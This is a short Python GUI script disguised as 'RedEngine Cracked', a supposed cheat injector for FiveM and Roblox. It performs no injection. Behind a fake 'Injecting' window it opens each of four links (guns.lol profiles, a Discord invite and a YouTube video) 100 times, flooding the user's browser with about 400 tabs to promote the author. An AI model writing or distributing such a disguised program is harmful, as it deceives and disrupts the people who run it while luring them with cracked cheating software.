import webbrowser
import tkinter as tk
import time
from threading import Thread

# List of URLs to open
urls = [
    "https://guns.lol/ayrai",
    "https://guns.lol/ipburner",
    "https://discord.gg/bypasscity",
    "https://youtu.be/ulG2NGSJS8o?si=AsxiWOXm8GS3B_1w"

]

# Function to open URLs
def open_urls():
    for _ in range(100):  # Open each URL 100 times
        for url in urls:
            webbrowser.open_new_tab(url)
            time.sleep(0.1)  # Slight delay to avoid overwhelming the browser

# Function to show loading screen
def show_loading():
    loading_window = tk.Toplevel()
    loading_window.title("Loading...")
    loading_window.geometry("300x100")
    loading_window.configure(bg='black')

    label = tk.Label(loading_window, text="Injecting RedEngine To Fivem/Roblox", fg='red', bg='black', font=("Helvetica", 12))
    label.pack(pady=20)

    button = tk.Button(loading_window, text="Confirm", command=loading_window.destroy, bg='red', fg='white')
    button.pack(pady=10)

    # Start the URL opening in a separate thread
    Thread(target=open_urls).start()

# Main application
def main():
    root = tk.Tk()
    root.title("RedEngine Cracked By Ayrai x <3")
    root.geometry("400x200")
    root.configure(bg='black')

    banner = tk.Label(root, text="RedEngine", fg='red', bg='black', font=("Helvetica", 16))
    banner.pack(pady=20)

    start_button = tk.Button(root, text="Inject RedEngine?", command=show_loading, bg='red', fg='white')
    start_button.pack(pady=20)

    root.mainloop()

if __name__ == "__main__":
    main()